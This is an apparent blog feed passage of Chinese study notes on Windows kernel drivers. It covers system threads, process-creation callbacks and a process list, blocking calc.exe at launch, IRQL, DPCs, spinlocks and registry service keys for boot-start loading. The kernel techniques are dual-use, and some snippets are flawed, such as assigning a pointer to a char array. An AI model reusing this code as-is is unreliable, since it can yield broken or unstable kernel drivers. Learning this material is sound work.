class="line">    NTSTATUS status = <span class="built_in">PsCreateSystemThread</span>(&amp;hThread, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, KThreadB, (PVOID)&amp;kEvent);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create System Thread Failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ZwClose</span>(hThread);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">KeWaitForSingleObject</span>(&amp;kEvent, Executive, KernelMode, FALSE, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Event Just Triggered\n&quot;</span>);</span><br><span class="line">        <span class="built_in">KeResetEvent</span>(&amp;kEvent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PsTerminateSystemThread</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/e36b8ba3325a6f34837cb3d2e7b5647a.png" alt="image-20240321104634499" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常复习操作系统&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 6-链表与进程</title>
    <link href="https://joe1sn.eu.org/2024/03/20/windows-kernel-driver-6-memory/"/>
    <id>https://joe1sn.eu.org/2024/03/20/windows-kernel-driver-6-memory/</id>
    <published>2024-03-20T01:24:51.000Z</published>
    <updated>2024-03-20T03:37:33.375Z</updated>
    
    <content type="html"><![CDATA[<p>感觉和之前学的bh文章有大量重复</p><span id="more"></span><h1 id="记录进程"><a class="markdownIt-Anchor" href="#记录进程"></a> 记录进程</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_Process</span> &#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    HANDLE pid;</span><br><span class="line">    PEPROCESS pEprocessObj;</span><br><span class="line">    <span class="type">char</span> ProcessName[<span class="number">0x10</span>];</span><br><span class="line">&#125; MyProcess, *pMyProcess;</span><br></pre></td></tr></table></figure><p>两个extern需要声明</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTKERNELAPI PUCHAR <span class="title">PsGetProcessImageFileName</span><span class="params">(PEPROCESS Process)</span></span>;</span><br><span class="line"><span class="function">NTKERNELAPI NTSTATUS <span class="title">PsLookupProcessByProcessId</span><span class="params">(HANDLE ProcessId, PEPROCESS* Process)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">ProcessNotify</span><span class="params">(HANDLE pid, HANDLE pid2, BOOLEAN value)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pid);</span><br><span class="line">    <span class="keyword">if</span> (value) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process Created %d\n&quot;</span>, pid2);</span><br><span class="line">        PEPROCESS CurrentProc = <span class="literal">NULL</span>;<span class="comment">//PsGetCurrentProcess();</span></span><br><span class="line">        <span class="built_in">PsLookupProcessByProcessId</span>(pid2, &amp;CurrentProc);</span><br><span class="line">        <span class="keyword">if</span> (!CurrentProc) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        PUCHAR processname = <span class="built_in">PsGetProcessImageFileName</span>(CurrentProc);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process Name %s\n&quot;</span>, processname);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">....<span class="comment">//驱动加载</span></span><br><span class="line">    LIST_ENTRY listhead = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">InitializeListHead</span>(&amp;listhead);</span><br><span class="line">    <span class="built_in">PsSetCreateProcessNotifyRoutine</span>(ProcessNotify, FALSE);</span><br><span class="line">....<span class="comment">//驱动卸载</span></span><br><span class="line">    <span class="built_in">PsSetCreateProcessNotifyRoutine</span>(ProcessNotify, TRUE);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/a607afcc046ab446e19d6c094816f690.png" alt="image-20240320101340059" /></p><p>将获取到的链表进行链接</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">ProcessNotify</span><span class="params">(HANDLE pid, HANDLE pid2, BOOLEAN value)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pid);</span><br><span class="line">    <span class="keyword">if</span> (value) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process Created %d\n&quot;</span>, pid2);</span><br><span class="line">        PEPROCESS CurrentProc = <span class="literal">NULL</span>;<span class="comment">//PsGetCurrentProcess();</span></span><br><span class="line">        <span class="built_in">PsLookupProcessByProcessId</span>(pid2, &amp;CurrentProc);</span><br><span class="line">        <span class="keyword">if</span> (!CurrentProc) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pMyProcess PMyProcess = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_NON_PAGED, <span class="built_in">sizeof</span>(MyProcess),<span class="string">&#x27;cpym&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (PMyProcess) &#123;</span><br><span class="line">            <span class="built_in">RtlZeroMemory</span>(PMyProcess, <span class="built_in">sizeof</span>(MyProcess));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// init value</span></span><br><span class="line">            PMyProcess-&gt;pid = pid2;</span><br><span class="line">            PMyProcess-&gt;pEprocessObj = CurrentProc;</span><br><span class="line">            PMyProcess-&gt;ProcessName = <span class="built_in">PsGetProcessImageFileName</span>(CurrentProc);</span><br><span class="line">            KIRQL irql = <span class="number">0</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">KeAcquireSpinLock</span>(&amp;kSpinLock, &amp;irql);</span><br><span class="line">            <span class="built_in">InsertTailList</span>(&amp;listhead, &amp;(PMyProcess-&gt;list));</span><br><span class="line">            <span class="built_in">KeReleaseSpinLock</span>(&amp;kSpinLock, irql);</span><br><span class="line">        &#125;</span><br><span class="line">        PUCHAR processname = <span class="built_in">PsGetProcessImageFileName</span>(CurrentProc);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Process Name %s\n&quot;</span>, processname);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// ....</span></span><br><span class="line">    <span class="built_in">InitializeListHead</span>(&amp;listhead);</span><br><span class="line">    <span class="built_in">PsSetCreateProcessNotifyRoutine</span>(ProcessNotify, FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Stopping -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Device Stopping\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (DriverObject-&gt;DeviceObject) &#123;</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(DriverObject-&gt;DeviceObject);</span><br><span class="line"></span><br><span class="line">        UNICODE_STRING symname = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;symname, SYM_NAME);</span><br><span class="line">        <span class="built_in">IoDeleteSymbolicLink</span>(&amp;symname);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PsSetCreateProcessNotifyRoutine</span>(ProcessNotify, TRUE);</span><br><span class="line"></span><br><span class="line">    PLIST_ENTRY temp = <span class="literal">NULL</span>;</span><br><span class="line">    pMyProcess tempMy = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (listhead.Blink != &amp;listhead)</span><br><span class="line">    &#123;</span><br><span class="line">        temp = <span class="built_in">RemoveTailList</span>(&amp;listhead);</span><br><span class="line">        tempMy = <span class="built_in">CONTAINING_RECORD</span>(temp, MyProcess, list);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;link -- name: %s -- pid: %d -- obj: %p\n&quot;</span>, tempMy-&gt;ProcessName, tempMy-&gt;pid, tempMy-&gt;pEprocessObj);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(temp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/10fa90fec961ee887b47e7671a155e8a.png" alt="image-20240320104220909" /></p><h1 id="禁止程序执行"><a class="markdownIt-Anchor" href="#禁止程序执行"></a> 禁止程序执行</h1><p>关于进程的遍历这里给出第二种方式，使用<code>PsSetCreateProcessNotifyRoutineEx</code>中使用<code>PPS_CREATE_NOTIFY_INFO</code></p><p>这个API有一个很坑的地方就是必须在 <strong>链接器</strong> 中加上<code>/INTEGRITYCHECK </code></p><p>回调函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">MyBlockProcessNotify</span><span class="params">(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//UNREFERENCED_PARAMETER(Process);</span></span><br><span class="line">    <span class="comment">//DbgPrint(&quot;ProcessCreated\n&quot;);</span></span><br><span class="line">    <span class="keyword">if</span> (CreateInfo) &#123;</span><br><span class="line">        CHAR Targetp[] = <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">        PCHAR ProcessName = (PCHAR)<span class="built_in">PsGetProcessImageFileName</span>(Process);</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;now running: %s, pid: %d\n&quot;</span>, ProcessName, ProcessId);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(Targetp, ProcessName)) &#123;</span><br><span class="line">            CreateInfo-&gt;CreationStatus = STATUS_UNSUCCESSFUL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注册和释放</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PsSetCreateProcessNotifyRoutineEx</span>(MyBlockProcessNotify, FALSE);</span><br><span class="line"><span class="built_in">PsSetCreateProcessNotifyRoutineEx</span>(MyBlockProcessNotify, TRUE);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/bc3576b1573b2f1dcc66ea581758eb23.png" alt="image-20240320112936409" /></p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://cloud.tencent.com/developer/article/2195942">https://cloud.tencent.com/developer/article/2195942</a></p><p><a href="https://www.bilibili.com/video/BV1QJ411A7kR">https://www.bilibili.com/video/BV1QJ411A7kR</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;感觉和之前学的bh文章有大量重复&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 5-中断级与自旋锁</title>
    <link href="https://joe1sn.eu.org/2024/03/19/windows-kernel-driver-5-thread-lock/"/>
    <id>https://joe1sn.eu.org/2024/03/19/windows-kernel-driver-5-thread-lock/</id>
    <published>2024-03-19T03:40:30.000Z</published>
    <updated>2024-03-19T05:32:21.470Z</updated>
    
    <content type="html"><![CDATA[<p>顺便复习操作系统了</p><span id="more"></span><h1 id="winos-相关原理"><a class="markdownIt-Anchor" href="#winos-相关原理"></a> WinOS 相关原理</h1><h2 id="中断级"><a class="markdownIt-Anchor" href="#中断级"></a> 中断级</h2><p>如果有时间的话可以试着玩一玩这个游戏：<a href="https://github.com/plbrault/youre-the-os">https://github.com/plbrault/youre-the-os</a><br />在线：<a href="https://plbrault.github.io/youre-the-os/">https://plbrault.github.io/youre-the-os/</a><br />或许在游玩的过程中你会自己总结出一套操作系统进程调度的一套方法，便于其他方法的理解</p><ul><li><p>调度方式：抢占式</p></li><li><p>最小执行单元：纤程-&gt;线程-&gt;进程</p></li><li><p>中断级( Irql ) 0-&gt;2级别越来越高，高级别可以打断低级别</p><ul><li><p>0：Pass level</p></li><li><p>1：Apc level</p></li><li><p>2:  Dpc level</p><p>ISR延迟调用，硬件中断后，不那么紧急的任务放在DPC队列中</p><p>DPC访问换页内存，页面换到磁盘中pagefile.sys，引起换页缺页中断，如果换页中断无法打断DPC，然后就会访问无效地址，造成BSOD，<strong>所以DPC中最好不要使用换页内存</strong>，也即要使用<code>nonpagedpool</code>，而不要使用<code>paged pool</code></p></li><li><p>hardware(io…)</p></li><li><p>强制打断：ipicall</p></li></ul></li></ul><hr /><h2 id="自旋锁"><a class="markdownIt-Anchor" href="#自旋锁"></a> 自旋锁</h2><p>有一间厕所，A进去后就锁上了厕所的门。B和C的其他就只有在门外排队等待</p><p>应用场景：</p><ol><li>操作危险数据：全局变量等（可以参考SQL）</li><li>可重入代码</li></ol><h1 id="编程相关"><a class="markdownIt-Anchor" href="#编程相关"></a> 编程相关</h1><h2 id="中断级-2"><a class="markdownIt-Anchor" href="#中断级-2"></a> 中断级</h2><p>获取自身中断级别：<code>KeGetCurrentIrql()</code></p><p>升级到DPC：<code>KeRaiseIrqlToDpcLevel</code></p><p>降级：<code>KeLowerIrql</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Current Irql %d\nNow Try Raise to DPC\n&quot;</span>, <span class="built_in">KeGetCurrentIrql</span>());</span><br><span class="line">KIRQL irql = <span class="built_in">KeGetCurrentIrql</span>();</span><br><span class="line">irql = <span class="built_in">KeRaiseIrqlToDpcLevel</span>();</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;After, Current Irql %d\nNow Try decrease to Pass\n&quot;</span>, <span class="built_in">KeGetCurrentIrql</span>());</span><br><span class="line"><span class="built_in">KeLowerIrql</span>(irql);</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;End, Current Irql %d\n&quot;</span>, <span class="built_in">KeGetCurrentIrql</span>());</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/f8a151dfb7251cac0df165f46d55d1dc.png" alt="image-20240319120411828" /></p><p>将线程保持在DPC会导致蓝屏</p><p>应用：希望函数在该线程执行中：1.不被中断，2：相关目标不被执行或者修改等<br />MSDN中有每个内核函数的中断级</p><p>创建<code>DPC</code>线程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">DpcRoutineFunc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Current Irql: %d\n&quot;</span>, <span class="built_in">KeGetCurrentIrql</span>());</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line">    <span class="built_in">DpcRoutineFunc</span>(<span class="literal">NULL</span>);</span><br><span class="line">    KDPC kDPC = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">KeInitializeDpc</span>(&amp;kDPC, (PKDEFERRED_ROUTINE)DpcRoutineFunc, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">KeInsertQueueDpc</span>(&amp;kDPC, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/96a0d5ff9e79d3cff2a3a7b55d7cc284.png" alt="image-20240319132207124" /></p><p>DPC中调用<code>ZwOpenFile</code>之类的会BSOD</p><h2 id="自旋锁-2"><a class="markdownIt-Anchor" href="#自旋锁-2"></a> 自旋锁</h2><p>一般的自旋锁都是全局变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">KeInitializeSpinLock</span>(&amp;kSpinLock);</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;SpinLock init\n&quot;</span>);</span><br><span class="line"><span class="built_in">KeAcquireSpinLock</span>(&amp;kSpinLock, &amp;irql);</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;SpinLock Locked\n&quot;</span>);</span><br><span class="line"><span class="built_in">KeReleaseSpinLock</span>(&amp;kSpinLock, irql);</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;SpinLock Delocked\n&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/18a36fa375def74acfc677a3d2b4d42a.png" alt="image-20240319130611722" /></p><p><img src="https://img.joe1sn.top/uploads/big/de072b093fecf39c949ca7a6c5f18720.png" alt="image-20240319130947718" /></p><p>加锁这个函数会会提升到DPC中，但是DPC不能访问可分页内存，例如Ring3下的PCB中的LDR</p><p>视频给出了一个技巧</p><p><img src="https://img.joe1sn.top/uploads/big/e9622aaae7767eaa047e1a96c6a0d4c1.png" alt="image-20240319131322729" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;顺便复习操作系统了&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    <category term="kernel" scheme="https://joe1sn.eu.org/categories/notes/kernel/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>windows内核驱动 4-内核注册表</title>
    <link href="https://joe1sn.eu.org/2024/03/18/windows-kernel-driver-4-reg/"/>
    <id>https://joe1sn.eu.org/2024/03/18/windows-kernel-driver-4-reg/</id>
    <published>2024-03-18T04:34:17.000Z</published>
    <updated>2024-03-18T05:53:30.604Z</updated>
    
    <content type="html"><![CDATA[<p>使用内核注册表实现开机启动驱动等</p><span id="more"></span><h1 id="内核注册表"><a class="markdownIt-Anchor" href="#内核注册表"></a> 内核注册表</h1><p>驱动创建描述符<code>SYM_NAME</code>后，会出现在注册表<code>计算机\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services</code>中</p><p>启动项的名字为驱动的文件名，例如<code>hevd_2</code></p><p><img src="https://img.joe1sn.top/uploads/big/b528aa7e87d652d8b4120c16e3215e0e.png" alt="image-20240318124522823" /></p><ul><li>Start：2-开机自启动、3-手动启动、4-禁用，数字越小启动越早</li></ul><p><img src="https://img.joe1sn.top/uploads/big/56cf71331d4e2d9b0efd73ac2165aa49.png" alt="image-20240318124919612" /></p><p>打开注册表<code>ZwCreateKey</code>和<code>ZwOpenKey</code></p><h1 id="移动驱动启动位置并修改注册表"><a class="markdownIt-Anchor" href="#移动驱动启动位置并修改注册表"></a> 移动驱动启动位置并修改注册表</h1><p><code>ZwCreateKey</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">HANDLE hRegKey = <span class="literal">NULL</span>;</span><br><span class="line">OBJECT_ATTRIBUTES RegAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ULONG KeyOp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">InitializeObjectAttributes</span>(&amp;RegAttribute, RegistryPath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">status = <span class="built_in">ZwCreateKey</span>(&amp;hRegKey, KEY_ALL_ACCESS, &amp;RegAttribute, <span class="number">0</span>, <span class="literal">NULL</span>, REG_OPTION_NON_VOLATILE, &amp;KeyOp);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (KeyOp == REG_CREATED_NEW_KEY) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create New key\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (KeyOp == REG_OPENED_EXISTING_KEY) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Registry key opened\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ZwOpenKey</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">KernelReg</span><span class="params">(PUNICODE_STRING RegistryPath)</span> </span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    HANDLE hRegKey = <span class="literal">NULL</span>;</span><br><span class="line">    OBJECT_ATTRIBUTES RegAttribute = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ULONG KeyOp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    PVOID KeyInfo = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_NON_PAGED, <span class="number">0x1000</span>, <span class="string">&#x27;kcaH&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (KeyInfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Allocate Mem Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(KeyInfo, <span class="number">0x1000</span>);</span><br><span class="line">    UNICODE_STRING regKeyName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;regKeyName, <span class="string">L&quot;ImagePath&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;RegAttribute, RegistryPath, OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//status = ZwOpenKey(&amp;hRegKey, KEY_ALL_ACCESS, &amp;RegAttribute, 0, NULL, REG_OPTION_NON_VOLATILE, &amp;KeyOp);</span></span><br><span class="line">    status = <span class="built_in">ZwOpenKey</span>(&amp;hRegKey, KEY_ALL_ACCESS, &amp;RegAttribute);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Open Reg Key Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    status = <span class="built_in">ZwQueryValueKey</span>(hRegKey, &amp;regKeyName, KeyValuePartialInformation, KeyInfo, <span class="number">0x1000</span> - <span class="number">1</span>, &amp;KeyOp);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">        <span class="built_in">DbgPrint</span>(<span class="string">&quot;Read Reg Key Failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">ZwClose</span>(hRegKey);</span><br><span class="line">        <span class="built_in">ExFreePool</span>(KeyInfo);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    